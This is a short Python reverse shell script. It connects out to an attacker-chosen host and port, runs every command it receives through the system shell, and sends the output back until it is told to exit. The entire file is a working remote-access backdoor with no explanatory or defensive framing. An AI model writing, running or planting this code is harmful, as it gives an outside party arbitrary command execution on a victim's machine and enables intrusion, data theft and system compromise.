#coding:utf-8
import socket, sys, subprocess as sp

host = str(sys.argv[1])
port = int(sys.argv[2])

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))
while True:
	command = str(conn.recv(1024))

	if command != "exit()":
		sh = sp.Popen(command, shell = True, stdout = sp.PIPE, stderr = sp.PIPE, stdin = sp.PIPE)
		out , err = sh.communicate()

		result = str(out) + str(err)
		length = str(len(result)).zfill(16)
		conn.send(length + result)
	else: break

conn.close()
